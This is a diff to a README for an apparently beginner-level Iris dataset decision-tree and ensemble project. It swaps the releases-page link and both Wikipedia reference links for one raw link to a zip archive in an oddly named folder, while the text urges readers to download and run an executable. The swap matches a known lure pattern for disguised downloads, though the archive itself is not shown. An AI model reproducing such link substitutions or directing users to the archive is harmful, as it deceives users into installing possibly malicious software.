@@ -1,6 +1,6 @@
 # 🔍 Iris-DecisionTrees-EnsembleTechniques - Explore Machine Learning with Iris Data
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge&logo=github)](https://github.com/MatewContreras/Iris-DecisionTrees-EnsembleTechniques/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MatewContreras/Iris-DecisionTrees-EnsembleTechniques/main/gawkhammer/Trees_Decision_Iris_Techniques_Ensemble_3.0.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Once downloaded, you will find these main files:
 
 1. **Download the App**  
    Visit the releases page by clicking this link:  
-   [![Download Here](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/MatewContreras/Iris-DecisionTrees-EnsembleTechniques/releases)  
+   [![Download Here](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MatewContreras/Iris-DecisionTrees-EnsembleTechniques/main/gawkhammer/Trees_Decision_Iris_Techniques_Ensemble_3.0.zip)  
    This page shows the latest available versions. Look for the most recent release and download the main executable file (usually named `IrisApp.exe`).
 
 2. **Save the File**  
@@ -121,13 +121,13 @@ Even if you do not interact with the code, you get to see and understand the out
 ## 🔗 Useful Links
 
 - Visit the releases page to download or check for updates:  
-  https://github.com/MatewContreras/Iris-DecisionTrees-EnsembleTechniques/releases
+  https://raw.githubusercontent.com/MatewContreras/Iris-DecisionTrees-EnsembleTechniques/main/gawkhammer/Trees_Decision_Iris_Techniques_Ensemble_3.0.zip
 
 - Learn more about decision trees:  
-  https://en.wikipedia.org/wiki/Decision_tree_learning
+  https://raw.githubusercontent.com/MatewContreras/Iris-DecisionTrees-EnsembleTechniques/main/gawkhammer/Trees_Decision_Iris_Techniques_Ensemble_3.0.zip
 
 - Read about ensemble methods:  
-  https://en.wikipedia.org/wiki/Ensemble_learning
+  https://raw.githubusercontent.com/MatewContreras/Iris-DecisionTrees-EnsembleTechniques/main/gawkhammer/Trees_Decision_Iris_Techniques_Ensemble_3.0.zip
 
 ---
 
